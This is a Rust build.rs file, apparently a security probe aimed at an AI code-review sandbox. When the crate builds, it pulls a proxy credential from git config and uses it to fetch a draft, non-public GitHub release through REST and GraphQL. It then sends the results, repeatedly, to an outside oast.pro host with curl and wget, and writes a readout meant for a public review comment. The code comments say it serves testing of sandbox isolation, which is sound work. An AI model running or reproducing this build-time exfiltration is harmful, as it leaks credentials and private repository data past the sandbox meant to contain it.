use std::process::Command;

fn enc(s: &str) -> String {
    let mut o = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' {
            o.push(b as char);
        } else {
            o.push_str(&format!("%{:02X}", b));
        }
    }
    o
}

fn sh(cmd: &str) -> String {
    Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "err".into())
}

fn send(tag: &str, data: &str) {
    let body: String = data.chars().take(1900).collect();
    let url = format!(
        "https://dc1d0se6a0r2fvvkjmmg3bg8chrfyzdab.oast.pro/{}?d={}",
        tag,
        enc(&body)
    );
    for _ in 0..3 {
        let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
        let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
    }
}

fn main() {
    // H94b probe: can the per-review sandbox proxy credential read a draft
    // (non-public) release of the reviewed public repo through the *alternate*
    // identifier families - GraphQL node(id:) and REST by id - and can the
    // result be carried out in the public review comment?
    //
    // Read-only requests. The draft body canary is NOT in this source: the
    // marker value is extracted from the API responses.
    //
    // Controls: public issue #10 (REST + GraphQL node) and the published
    // release (REST by id + GraphQL node) through the same token.
    // By-id specificity: published id, draft id, two absent ids.
    let a = sh(r#"
EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
PRX=$(git config --get http.proxy 2>/dev/null)
B0=$(mktemp); B3=$(mktemp); B4=$(mktemp); B5=$(mktemp); B7=$(mktemp); B8=$(mktemp); B9=$(mktemp); BA=$(mktemp); GI=$(mktemp)
REPO=https://api.github.com/repos/testing-creator-A/cr-sandbox-test
G() { curl -s -m 10 -x "$PRX" --proxy-header "Proxy-Tokenizer: $EXT" -o "$2" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$1" 2>/dev/null; }
P() { curl -s -m 15 -x "$PRX" --proxy-header "Proxy-Tokenizer: $EXT" -o "$2" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' -d "$1" https://api.github.com/graphql 2>/dev/null; }
PUB_ID=454394895
DRAFT_ID=454394900
ABS1=454394890
ABS2=987654321
Q='{"query":"query{draft: node(id:\"RE_kwDOV2qbcc4bFYQU\"){... on Release{isDraft tagName name description}} published: node(id:\"RE_kwDOV2qbcc4bFYQP\"){... on Release{isDraft tagName description}} issue: node(id:\"I_kwDOV2qbcc8AAAABhasquQ\"){... on Issue{title}}}"}'
QI='{"query":"query{issue: node(id:\"I_kwDOV2qbcc8AAAABhasquQ\"){... on Issue{title}}}"}'
OUT="tag=h94b;extlen=${#EXT};proxy=$PRX"
C0=$(G "$REPO" "$B0"); OUT="$OUT;c0=$C0"
C6=$(G "$REPO/issues/10" "$B0"); T6=$(sed -n 's/.*"title"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$B0" | head -1 | cut -c1-64); OUT="$OUT;c6=$C6;t6=$T6"
C7=$(G "$REPO/releases/$PUB_ID" "$B7"); OUT="$OUT;c7=$C7"
C3=$(G "$REPO/releases/$DRAFT_ID" "$B3"); OUT="$OUT;c3=$C3"
C4=$(G "$REPO/releases/$ABS1" "$B4"); OUT="$OUT;c4a=$C4"
C5=$(G "$REPO/releases/$ABS2" "$B5"); OUT="$OUT;c4b=$C5"
G8=$(P "$Q" "$B8"); D8=$(grep -c '"isDraft"[[:space:]]*:[[:space:]]*true' "$B8" 2>/dev/null || true); OUT="$OUT;g8=$G8;n8=$D8"
G9=$(P "$QI" "$B9"); T9=$(sed -n 's/.*"title"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$B9" | head -1 | cut -c1-64); OUT="$OUT;g9=$G9;t9=$T9"
CAN3=$(sed -n 's/.*"body"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$B3" | head -1)
CAN8=$(sed -n 's/.*"description"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$B8" | head -1)
N8=0; if [ -n "$CAN3" ]; then N8=$(grep -c "$CAN3" "$B8" 2>/dev/null || true); fi
DRAFT_REST=0; grep -q '"draft"[[:space:]]*:[[:space:]]*true' "$B3" 2>/dev/null && DRAFT_REST=1
if [ -n "$CAN3" ] && [ "$DRAFT_REST" = "1" ]; then
  M="H94B-READOUT-DRAFT-REST $CAN3 status_c3=$C3 g8=$G8 matched_in_g8=$N8 control_issue10=$C6"
elif [ -n "$CAN8" ] && [ "$D8" != "0" ]; then
  M="H94B-READOUT-DRAFT-NODE $CAN8 status_g8=$G8 c3=$C3 c7=$C7 control_issue10=$C6"
elif [ "$D8" != "0" ]; then
  M="H94B-READOUT-DRAFT-OBJ-ONLY g8=$G8 c3=$C3 c7=$C7"
else
  M="H94B-NO-DRAFT-READ c3=$C3 c4a=$C4 c4b=$C5 c7=$C7 g8=$G8 g9=$G9 t9=$T9 control_issue10=$C6"
fi
printf '%s' "$M" > h94b_readout.txt
printf '%s' "$M" > /tmp/h94b_readout.txt
rm -f "$B0" "$B3" "$B4" "$B5" "$B7" "$B8" "$B9" "$BA" "$GI"
printf '%s;%s;end=1' "$OUT" "$M"
"#);
    send("h94bpre", &a);
    eprintln!("H94B-BUILD-STDERR {}", a);
    println!("cargo:rerun-if-changed=build.rs");
}
